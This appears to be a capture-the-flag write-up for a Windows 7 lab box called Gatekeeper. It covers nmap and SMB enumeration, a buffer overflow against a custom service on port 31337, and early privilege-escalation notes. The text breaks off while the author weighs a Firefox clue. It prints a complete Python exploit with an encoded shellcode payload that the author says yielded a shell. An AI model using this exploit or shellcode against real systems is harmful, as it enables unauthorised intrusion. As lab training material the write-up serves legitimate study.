# Gatekeeper

## Recon

There not much for an introduction on this one. The description mentions passing through the gatekeeper and there's fire on the other side.

### Scanning
#### NMAP
```bash
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
31337/tcp open  Elite?       syn-ack ttl 125
| fingerprint-strings: 
|   GetRequest: 
|     Hello GET / HTTP/1.0
|_    Hello
49152/tcp open  unknown      syn-ack ttl 125
49153/tcp open  unknown      syn-ack ttl 125
49154/tcp open  unknown      syn-ack ttl 125
49155/tcp open  unknown      syn-ack ttl 125
49161/tcp open  unknown      syn-ack ttl 125
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.92%I=9%D=2/11%Time=62072C3C%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n");
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (95%), Microsoft Windows 7 SP1 (95%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (94%)
```

#### SMBmap
```bash
[+] Guest session       IP: 10.10.79.126:139    Name: 10.10.79.126
        Disk                                                    Permissions      Comment
        ----                                                    -----------      -------
        ADMIN$                                                  NO ACCESSRemote Admin
        C$                                                      NO ACCESSDefault share
        IPC$                                                    NO ACCESSRemote IPC
        Users                                                   READ ONLY
        .\Users\*
        dw--w--w--                0 Thu May 14 20:57:08 2020    .
        dw--w--w--                0 Thu May 14 20:57:08 2020    ..
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Default
        fr--r--r--              174 Tue Apr 21 22:18:13 2020    desktop.ini
        dr--r--r--                0 Thu May 14 20:58:07 2020    Share
        .\Users\Default\*
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    .
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    ..
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    AppData
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Desktop
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Documents
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Downloads
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Favorites
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Links
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Music
        fr--r--r--           262144 Tue Apr 21 22:18:13 2020    NTUSER.DAT
        fr--r--r--             1024 Tue Apr 21 22:18:13 2020    NTUSER.DAT.LOG
        fr--r--r--           189440 Tue Apr 21 22:18:13 2020    NTUSER.DAT.LOG1
        fr--r--r--                0 Tue Apr 21 22:18:13 2020    NTUSER.DAT.LOG2
        fr--r--r--            65536 Tue Apr 21 22:18:13 2020    NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
        fr--r--r--           524288 Tue Apr 21 22:18:13 2020    NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
        fr--r--r--           524288 Tue Apr 21 22:18:13 2020    NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Pictures
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Saved Games
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Videos
        .\Users\Default\AppData\*
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Local
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Roaming
        .\Users\Default\AppData\Local\*
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Microsoft
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Temp
        .\Users\Default\AppData\Local\Microsoft\*
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Windows
        .\Users\Default\AppData\Local\Microsoft\Windows\*
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    GameExplorer
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    History
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Temporary Internet Files
        .\Users\Default\AppData\Roaming\*
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Media Center Programs
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Microsoft
        .\Users\Default\AppData\Roaming\Microsoft\*
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Internet Explorer
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Windows
        .\Users\Default\AppData\Roaming\Microsoft\Internet Explorer\*
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Quick Launch
        .\Users\Default\AppData\Roaming\Microsoft\Windows\*
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    .
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    ..
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Cookies
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Network Shortcuts
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Printer Shortcuts
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Recent
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    SendTo
        dw--w--w--                0 Sun Apr 19 14:51:00 2020    Start Menu
        dr--r--r--                0 Sun Apr 19 14:51:00 2020    Templates
        .\Users\Share\*
        dr--r--r--                0 Thu May 14 20:58:07 2020    .
        dr--r--r--                0 Thu May 14 20:58:07 2020    ..
        fr--r--r--            13312 Thu May 14 20:58:07 2020    gatekeeper.exe
```
		
It looks like we found the gatekeeper. Guess I'll get to use the Windows 11 dev box again.

## Exploit development

I moved the file over to my dev box and fired it up in the debugger.
Exploit development went well. No suprises and the script made everything easy.

Here's the completed POC

```python3
#!/usr/bin/env python3

import socket

ip = "192.168.1.104"
port = 31337

prefix = " "
offset = 145
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = "\xba\x43\xa3\x7c\x5b\xdb\xd3\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x52\x31\x56\x12\x83\xc6\x04\x03\x15\xad\x9e\xae\x65\x59\xdc\x51\x95\x9a\x81\xd8\x70\xab\x81\xbf\xf1\x9c\x31\xcb\x57\x11\xb9\x99\x43\xa2\xcf\x35\x64\x03\x65\x60\x4b\x94\xd6\x50\xca\x16\x25\x85\x2c\x26\xe6\xd8\x2d\x6f\x1b\x10\x7f\x38\x57\x87\x6f\x4d\x2d\x14\x04\x1d\xa3\x1c\xf9\xd6\xc2\x0d\xac\x6d\x9d\x8d\x4f\xa1\x95\x87\x57\xa6\x90\x5e\xec\x1c\x6e\x61\x24\x6d\x8f\xce\x09\x41\x62\x0e\x4e\x66\x9d\x65\xa6\x94\x20\x7e\x7d\xe6\xfe\x0b\x65\x40\x74\xab\x41\x70\x59\x2a\x02\x7e\x16\x38\x4c\x63\xa9\xed\xe7\x9f\x22\x10\x27\x16\x70\x37\xe3\x72\x22\x56\xb2\xde\x85\x67\xa4\x80\x7a\xc2\xaf\x2d\x6e\x7f\xf2\x39\x43\xb2\x0c\xba\xcb\xc5\x7f\x88\x54\x7e\x17\xa0\x1d\x58\xe0\xc7\x37\x1c\x7e\x36\xb8\x5d\x57\xfd\xec\x0d\xcf\xd4\x8c\xc5\x0f\xd8\x58\x49\x5f\x76\x33\x2a\x0f\x36\xe3\xc2\x45\xb9\xdc\xf3\x66\x13\x75\x99\x9d\xf4\xba\xf6\x9c\x74\x53\x05\x9e\x65\xff\x80\x78\xef\xef\xc4\xd3\x98\x96\x4c\xaf\x39\x56\x5b\xca\x7a\xdc\x68\x2b\x34\x15\x04\x3f\xa1\xd5\x53\x1d\x64\xe9\x49\x09\xea\x78\x16\xc9\x65\x61\x81\x9e\x22\x57\xd8\x4a\xdf\xce\x72\x68\x22\x96\xbd\x28\xf9\x6b\x43\xb1\x8c\xd0\x67\xa1\x48\xd8\x23\x95\x04\x8f\xfd\x43\xe3\x79\x4c\x3d\xbd\xd6\x06\xa9\x38\x15\x99\xaf\x44\x70\x6f\x4f\xf4\x2d\x36\x70\x39\xba\xbe\x09\x27\x5a\x40\xc0\xe3\x7a\xa3\xc0\x19\x13\x7a\x81\xa3\x7e\x7d\x7c\xe7\x86\xfe\x74\x98\x7c\x1e\xfd\x9d\x39\x98\xee\xef\x52\x4d\x10\x43\x52\x44;"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

## Exploit

I created a new payload and adjusted the POC to match the actual target and it worked! I got a shell as the user `natbat`. No special privileges. This is a pretty old version of windows, I could probably find a privesc vulnerability relatively easy.

## Privilege Escalation
### Windows Exploit Suggester

I exfiltrated a copy of `systeminfo` and passed it to `windows-exploit-suggester.py`

Then I used some grep magic to search for privesc.

```bash
cat exploitSuggester | grep Priv | grep -E "^MS..-..."
```


>MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important

>MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important

>MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important

>MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important

>MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important

>MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important


### WinPEAS

I used `WinPEAS.bat` to enumerate from the inside.

> I keep seeing references to firefox on the target. 

> WinPEAS also didn't see patches for many vulnerabilities on this machine.

> The smb `Users` share is at `C:\Users\`

> Hostname: Gatekeeper

>The Firewall is up and running a Standard profile.

> Allowed programs configuration for Standard profile:                               
> Mode     Traffic direction    Name / Program                                             
Enable   Inbound              dostackbufferoverflowgood.exe / C:\users\mayor\desktop\dostackbufferoverflowgood.exe

There seems to be some file `dostackbufferoverflowgood.exe`. I did see one internal port running...

Found 2 ports that are open internally only:

>   UDP    127.0.0.1:1900         *:*                                    2200
  UDP    127.0.0.1:57514        *:*                                    2200

Couldn't set up port forwarding because I'm not admin.



## Beware of fire

It's been a few days since I gained initial access to this box. I was thinking tonight about the clues on this box and was trying to figure out what this meant:

> there's fire on the other side.

There were some ports that were only available on localhost, so in a sense that would be like a firewall. I thought this was the fire. Tonight I really wanted to dig in and see if this "fire on the other side" was a firewall or something else. As I was reviewing the software I remembered Firefox is instlled on this one. I remember seeing a *.lnk file right next to the user.txt.

I think I brushed this off initially as a "too-obvious" rabbit-hole type of trap...but maybe the answer was staring me in the face the whole time.

